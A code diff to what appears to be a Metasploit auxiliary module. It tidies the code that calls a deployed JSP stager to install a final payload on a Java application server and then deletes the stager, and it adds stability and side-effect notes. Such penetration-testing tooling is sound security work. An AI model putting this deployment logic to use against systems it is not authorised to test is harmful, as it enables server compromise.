@@ -29,6 +29,11 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'DefaultAction' => 'Deploy',
       'License' => BSD_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -66,36 +71,38 @@ class MetasploitModule < Msf::Auxiliary
     if package.nil?
       print_error('Deployment failed')
       return
-    else
-      print_good('Deployment successful')
     end
 
-    unless http_verb == 'POST'
-      # call the stager to deploy our real payload war
-      stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
-      payload_data = "#{Rex::Text.rand_text_alpha(rand(8..15))}=#{Rex::Text.uri_encode(encoded_payload)}"
-      print_status("Calling stager #{stager_uri} to deploy final payload...")
-      res = deploy('method' => 'POST',
-                   'data' => payload_data,
-                   'uri' => stager_uri)
-      if res && res.code == 200
-        print_good('Payload deployed')
-      else
-        print_error('Failed to deploy final payload')
-      end
+    print_good('Deployment successful')
 
-      # Remove the stager
-      print_status('Removing stager...')
-      files = {}
-      files[:stager_jsp_name] = "#{stager_name}.war/#{stager_name}.jsp"
-      files[:stager_base] = "#{stager_name}.war"
-      delete_script = generate_bsh(:delete, files)
-      res = deploy_package(delete_script, package)
-      if res.nil?
-        print_error('Unable to remove Stager')
-      else
-        print_good('Stager successfully removed')
-      end
+    return if http_verb == 'POST'
+
+    # call the stager to deploy our real payload war
+    stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
+    payload_data = "#{Rex::Text.rand_text_alpha(rand(8..15))}=#{Rex::Text.uri_encode(encoded_payload)}"
+    print_status("Calling stager #{stager_uri} to deploy final payload...")
+    res = deploy(
+      'method' => 'POST',
+      'data' => payload_data,
+      'uri' => stager_uri
+    )
+    if res && res.code == 200
+      print_good('Payload deployed')
+    else
+      print_error('Failed to deploy final payload')
+    end
+
+    # Remove the stager
+    print_status('Removing stager...')
+    files = {}
+    files[:stager_jsp_name] = "#{stager_name}.war/#{stager_name}.jsp"
+    files[:stager_base] = "#{stager_name}.war"
+    delete_script = generate_bsh(:delete, files)
+    res = deploy_package(delete_script, package)
+    if res.nil?
+      print_error('Unable to remove Stager')
+    else
+      print_good('Stager successfully removed')
     end
   end
 
